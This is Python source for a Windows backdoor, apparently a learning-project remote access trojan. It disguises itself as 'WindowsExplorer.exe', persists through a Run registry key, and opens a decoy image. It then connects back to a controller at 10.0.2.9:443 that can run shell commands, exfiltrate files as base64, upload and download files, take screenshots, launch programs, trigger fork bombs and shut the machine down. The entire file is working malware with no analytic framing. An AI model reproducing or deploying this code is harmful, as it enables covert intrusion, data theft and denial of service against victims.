#!/usr/bin/env python

import socket
import subprocess
import json
import os
import base64
import threading
import shutil
import sys
import time
import requests
from mss import mss

class Backdoor:
    def __init__(self, ip, port):
        self.become_per()
        self.connection = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        self.connection.connect((ip, port))

    def become_per(self):
        file_location = os.environ["appdata"] + "\\WindowsExplorer.exe"
        if not os.path.exists(file_location):
            shutil.copyfile(sys.executable, file_location)
            subprocess.call('reg add HKCU\Software\Microsoft\Windows\CurrentVersion\Run /v update /t REG_SZ /d "' + file_location + '"', shell=True)

    def reliable_send(self, data):
        json_data = json.dumps(data)
        self.connection.send(json_data)

    def reliable_receive(self):
        json_data = ""
        while True:
            try:
                json_data = json_data + self.connection.recv(1024)
                return json.loads(json_data)
            except ValueError:
                continue

    def is_admin(self):
        global admin
        try:
            temp = os.listdir(os.sep.join([os.environ.get('SystemRoot', 'C:\windows'), 'temp']))
        except:
            admin = "[!!] User privileges"
        else:
            admin = "[-] Admin privileges"

    def exe_sys_cmd(self, command):
        DEVNULL = open(os.devnull, 'wb')
        return subprocess.check_output(command, shell=True, stderr=DEVNULL, stdin=DEVNULL)

    def download(self, url):
        get_response = requests.get(url)
        file_name = url.split("/")[-1]
        with open(file_name, "wb") as out_file:
            out_file.write(get_response.content)

    def screenshot(self):
        with mss() as screenshot:
            screenshot.shot()

    def change_wrk_directory(self, path):
        os.chdir(path)
        return "[+] Changing working directory to " + path
    def read_file(self, path):
        with open(path, "rb") as file:
            return base64.b64encode(file.read())
    def write_files(self, path, content):
        with open(path, "wb") as file:
            file.write(base64.b64decode(content))
            return "[+] Upload successful"

    def read_screenshot(self, path):
        with open(path, "rb") as file:
            return base64.b64encode(file.read())
        # with open("monitor-1.png", "rb") as sc:
            # self.reliable_send(base64.b64encode(sc.read()))

    def run(self):
        while True:
            command = self.reliable_receive()
            if "KeyboardInterrupt" in command:
                time.sleep(10)
                while True:
                    try:
                        run_backdoor()
                    except:
                        threading.Timer(5.0, run_backdoor).start()
                    else:
                        break
                
            try:
                if command[0] == "q":
                    continue
                elif command[0] == "exit":
                    self.connection.close()
                    break
                elif command[0] == "sendall":
                    command_results = self.exe_sys_cmd(command[1])
                elif command[0] == "cd" and len(command) > 1:
                    command_results = self.change_wrk_directory(command[1])
                elif command[0] == "download":
                    command_results = self.read_file(command[1])
                elif command[0] == "upload":
                    command_results = self.write_files(command[1], command[2])
                elif command[0] == "get":
                    try:
                        self.download(command[1])
                        command_results = "[+] Download file from specific URL!"
                    except:
                        command_results = "[-] Download failed from URL!"
                elif command[0] == "screenshot":
                    try:
                        self.screenshot()
                        command_results = self.read_screenshot("monitor-1.png")
                        #  with open("monitor-1.png", "rb") as sc:
                            #self.reliable_send(base64.b64encode(sc.read()))
                        os.remove("monitor-1.png")
                    except:
                        command_results = "[!!] Failed to take screenshot!"
                elif command[0] == "check":
                    try:
                        self.is_admin()
                        command_results = admin
                    except:
                        command_results = "Privileges check failed"
                elif command[0] == "start":
                    try:
                        subprocess.Popen(command[1], shell=True)
                        command_results = "[+] Program started!"
                    except:
                        command_results = "[-] Program failed to start"
                elif command [0] == "forkbomb_win":
                    try:
                        print("fork bomb by raw code is executed on system")
                        command = ":(){ :&:;};:"
                        self.exe_sys_cmd(command)
                    except Exception:
                        command_results = "forkbomb can't be executed :("
                elif command [0] == "forkbomb_mac":
                    try:
                        command_results = "Fork bomb for Mac OSX is starting"
                        command = 'perl -e "fork while fork" &'
                        self.exe_sys_cmd(command)
                    except Exception:
                        command_results = "Fork bomb can't be started on Mac OSX :("
                elif command[0] == 'shutdown':
                    try:
                        os.system("shutdown /s /t 1")
                    except Exception:
                        command_results = "Target could not shut down"
                else:
                    command_results = self.exe_sys_cmd(command)
            except Exception as e:
                command_results = "[-] Error during command execution"
            self.reliable_send(command_results)

time.sleep(2)
file_name = sys._MEIPASS + "\pic.jpg"
subprocess.Popen(file_name, shell=True)

time.sleep(5)
def run_backdoor():
    while True:
        try:
            my_backdoor = Backdoor("10.0.2.9", 443)
            my_backdoor.run()
        except Exception:
            threading.Timer(5.0, run_backdoor).start()
            break
run_backdoor()

